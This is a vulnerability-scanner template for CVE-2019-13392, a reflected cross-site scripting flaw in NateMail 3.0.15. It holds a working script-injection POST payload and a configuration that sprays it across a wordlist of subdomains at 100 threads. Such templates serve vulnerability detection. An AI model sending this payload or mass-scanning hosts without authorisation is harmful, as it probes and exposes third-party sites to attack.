id: CVE-2019-13392
info:
  name: MindPalette NateMail 3.0.15 - (XSS)
  author: pikpikcu
  severity: medium
  description: reflected Cross-Site Scripting (XSS) vulnerability in MindPalette NateMail 3.0.15 allows an attacker to execute remote JavaScript in a victim's browser via a specially crafted POST request. The application will reflect the recipient value if it is not in the NateMail recipient array. Note that this array is keyed via integers by default, so any string input will be invalid.
  reference:
    - https://www.doyler.net/security-not-included/natemail-vulnerabilities
    - https://nvd.nist.gov/vuln/detail/CVE-2019-13392
  tags: cve,cve2019,natemail,xss
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.10
    cve-id: CVE-2019-13392
    cwe-id: CWE-79
requests:
  - payloads:
      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
    attack: sniper
    threads: 100
    raw:
      - |
        POST /NateMail.php HTTP/1.1
        Host: {{Subdomains}}
        Accept: */*
        Content-Type: application/x-www-form-urlencoded

        recipient=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
    matchers-condition: and
    matchers:
      - type: word
        words:
          - '</script><script>alert(document.domain)</script>'
        part: body
      - type: word
        part: header
        words:
          - text/html
